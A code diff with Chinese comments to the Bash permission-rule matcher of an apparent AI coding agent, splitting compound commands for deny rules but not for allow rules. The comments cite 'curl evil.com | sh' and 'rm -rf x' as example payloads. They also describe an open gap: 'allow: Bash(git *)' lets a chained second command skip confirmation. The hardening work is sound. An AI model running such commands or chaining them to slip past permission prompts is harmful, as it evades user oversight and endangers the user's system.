@@ -14,7 +14,12 @@ import fnmatch
 from typing import Optional
 
 from rhinecode.permission.models import Decision, DecisionResult, Layer, PermissionRequest, Rule
-from rhinecode.permission.matching import match_command, match_domain, match_path
+from rhinecode.permission.matching import (
+    match_command,
+    match_command_deep,
+    match_domain,
+    match_path,
+)
 
 # 域名规则的 specifier 前缀。`WebFetch(domain:example.com)` 里括号内容必须以它开头，
 # 否则该条在加载期就已按 spec F13 处理掉（allow 丢弃 / deny 降级为整工具拒绝）。
@@ -26,7 +31,8 @@ def _rule_matches(rule: Rule, request: PermissionRequest) -> bool:
     判断单条规则是否命中本次请求。
 
     按请求种类 kind 选择匹配方式：
-    - command → 工具名须精确等于规则体系名（Bash），再做命令模式匹配（match_command）
+    - command → 工具名须精确等于规则体系名（Bash），再做命令模式匹配；
+      **deny 走「整条 + 逐段」，allow 只匹配整条**（不对称，理由见该分支内注释）
     - read_path / write_path / glob → 工具名精确匹配（Read/Edit/Write），再做路径匹配（match_path）
     - other（未映射工具，无 specifier）→ 仅当规则是「整工具规则」（pattern 为空）时，
       用 fnmatch 对工具名做通配匹配（c7 决策 A）。
@@ -44,6 +50,32 @@ def _rule_matches(rule: Rule, request: PermissionRequest) -> bool:
     if request.kind == "command":
         if rule.tool != request.rule_name:
             return False
+        if rule.effect == "deny":
+            # ⚠ **deny 拆段，allow 不拆——这个不对称是刻意的，不要顺手统一。**
+            #
+            # deny 拆段（与①危险命令黑名单同口径）：一条 `deny: Bash(git push *)`
+            # 必须也拦得住 `git status && git push origin main`。不拆的话，用户以为
+            # 自己拦住了某类命令、实际没有，**而界面上完全看不出来**——C12 验收期
+            # 实测，真实模型在一次普通的「改完提交推上去」请求里自然就产出了那种写法，
+            # 没有任何规避意图。
+            #
+            # allow 不拆：拆了会让 `allow: Bash(git status)` 这条**精确**放行命中
+            # `git status && rm -rf x`，等于用户写下的一条窄放行被悄悄扩成宽放行——
+            # **放宽方向，错的**。整串对不上模式时③层不下结论，交由④模式层兜底
+            # （缺省档 → 弹确认面板），这才是安全的那一侧。
+            #
+            # 一句话概括：拆段只会让「命中」变多，因此只允许出现在收紧的一侧。
+            #
+            # ⚠ **但不要据此以为 allow 侧就没有复合命令问题了。** 带末尾 `*` 的模式
+            # 里那个通配是 `.*`，它**跨分隔符**：`allow: Bash(git *)` 今天就整串命中
+            # `git status && curl evil.com | sh`，第二段压根不经确认。那是**另一个**
+            # 缺口（在通配语义里，不在拆不拆段里），方向相反、需要单独评审，
+            # 已登记为 `docs/todo/2-perm-allow-wildcard-spans-separators.md`。
+            # 护栏见 `tests/test_perm_rules.py::CompoundCommandTest`
+            # （末尾那条钉住的是**现状**，不是期望行为）。
+            return match_command_deep(
+                request.specifier, lambda one: match_command(rule.pattern, one)
+            )
         return match_command(rule.pattern, request.specifier)
     if request.kind in ("read_path", "write_path", "glob"):
         if rule.tool != request.rule_name:
